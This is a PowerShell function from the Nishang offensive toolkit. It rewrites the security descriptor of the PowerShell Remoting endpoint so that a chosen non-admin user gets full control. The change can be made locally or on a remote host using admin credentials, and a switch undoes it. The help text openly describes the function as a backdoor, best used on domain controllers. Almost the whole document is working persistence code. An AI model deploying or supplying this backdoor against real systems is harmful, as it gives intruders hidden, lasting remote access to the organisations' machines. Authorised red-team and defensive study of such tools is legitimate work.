function Set-RemotePSRemoting
{    
<#
.SYNOPSIS
Nishang script which can be used to modify Security Descriptors of PowerShell Remoting to provide access for non-admin domain users.
 
.DESCRIPTION
The script takes a username and adds FUll Control (Generic All) to the ACL of PowerShell Remoting

The script needs elevated shell locally and administrative privileges on a remote target. 

It is possible to remove the entries added by the script by using the -Remove option.

The script is very useful as a backdoor on any machine but more so on high value targets like Domain controllers.

If you get an error like 'The I/O operation has been aborted' - ignore it. The ACl has been most likely modified. 

.PARAMETER UserName
Username which will have remote access. 

.PARAMETER ComputerName
Target computer. Not required when the script is used locally. 

.PARAMETER Credential
Credential for the target remote computer. Not required if you already have administrative privileges on the remote computer. 

.PARAMETER Remove
Use this switch to remove permissions added by the script.


.EXAMPLE
PS C:\> Set-RemotePSRemoting -UserName labuser –Verbose
Use the above command to add permissions on the local machine for labuser to access PowerShell remoting.

.EXAMPLE
PS C:\> Set-RemotePSRemoting -UserName labuser -ComputerName targetserver -Credential admin
Use the above command to add permissions on the remote machine for labuser to access PowerShell remoting.

.EXAMPLE
PS C:\> Set-RemotePSRemoting -UserName labuser -ComputerName targetserver -Credential admin -Remove
Remove the permissions added for labuser from the remote machine.


.LINK
https://github.com/ssOleg/Useful_code/blob/master/Set-RemoteShellAccess.ps1
https://github.com/samratashok/nishang
#>    
    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $UserName,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $ComputerName,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Remove
    )
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) 
    {
        Write-Warning "Run the script as an Administrator"
        Break
    }
    $RemoteScriptBlock = 
    {
        Param(
            [Parameter( Mandatory = $True)]
            [String]
            $UserName,
           
            $Remove
        )
        $SID = (New-Object System.Security.Principal.NTAccount($UserName)).Translate([System.Security.Principal.SecurityIdentifier]).value
        # Build an SD based on existing DACL
        $existingSDDL = (Get-PSSessionConfiguration -Name "Microsoft.PowerShell" -Verbose:$false).SecurityDescriptorSDDL
        Write-Verbose "Existing ACL for PSRemoting is $existingSDDL"
        $isContainer = $false
        $isDS = $false
        $SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer,$isDS, $existingSDDL

        if (!$Remove)
        {
            #Create Full Control ACE entries for the target user
            $accessType = "Allow"
            #FullControl - https://blog.cjwdev.co.uk/2011/06/28/permissions-not-included-in-net-accessrule-filesystemrights-enum/
            $accessMask = 268435456
            $inheritanceFlags = "none"
            $propagationFlags = "none"
            $SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType,$SID,$accessMask,$inheritanceFlags,$propagationFlags) | Out-Null
                          
            # Combined SDDL
            $newSDDL = $SecurityDescriptor.GetSddlForm("All")

            Write-Verbose "Updating ACL for PSRemoting."
            Set-PSSessionConfiguration -name "Microsoft.PowerShell" -SecurityDescriptorSddl $newSDDL -force -Confirm:$false -Verbose:$false | Out-Null

            Write-Verbose "New ACL for PSRemoting is $newSDDL"
        }
        elseif ($Remove)
        {
            foreach ($SDDL in $SecurityDescriptor.DiscretionaryAcl)
            {
                if ($SDDL.SecurityIdentifier.Value -eq $SID)
                {
                    Write-Verbose "Removing access for user $UserName."
                    $SecurityDescriptor.DiscretionaryAcl.RemoveAccess([System.Security.AccessControl.AccessControlType]::Allow,$SID,$SDDL.AccessMask,$SDDL.InheritanceFlags,$SDDL.PropagationFlags) | Out-Null

                    # Combined SDDL
                    $newSDDL = $SecurityDescriptor.GetSddlForm("All")
                    Set-PSSessionConfiguration -name "Microsoft.PowerShell" -SecurityDescriptorSddl $newSDDL -force -Confirm:$false -Verbose:$false | Out-Null

                    $existingSDDL = (Get-PSSessionConfiguration -Name "Microsoft.PowerShell" -Verbose:$false).SecurityDescriptorSDDL
                    Write-Verbose "New ACL for PSRemoting is $existingSDDL"
                }
            }
        }
    }
    if ($ComputerName)
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ComputerName $ComputerName -Credential $Credential -ArgumentList $username,$Remove
    }

    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList $username,$Remove
    }
}

